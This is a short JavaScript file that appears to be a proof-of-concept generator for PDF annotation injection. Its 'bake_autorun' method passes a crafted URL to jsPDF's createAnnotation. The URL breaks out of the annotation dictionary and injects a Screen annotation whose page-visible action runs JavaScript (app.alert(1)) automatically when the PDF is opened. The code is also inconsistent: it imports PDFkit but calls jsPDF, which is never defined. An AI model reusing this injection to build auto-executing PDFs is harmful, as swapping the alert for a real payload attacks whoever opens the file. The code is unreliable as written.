const {PDFkit} = require("pdfkit");

class jsPDF_template{

	constructor(){
		this.state = -1 // building state
		var doc = new jsPDF();
	}


	bake_autorun(out_name="autorun-no-intereaction") {
		var doc = new jsPDF();
		doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},
		type:'link',url:`/) >> >><</Subtype /Screen /Rect [0 0 900 900] /AA <</PV <</S/JavaScript/JS(app.alert(1))>>/(`});
		doc.text(20, 20, 'Execute automatically');
		doc.save(out_name + ".pdf");
		this.state = 1
		return this.state;
	}
}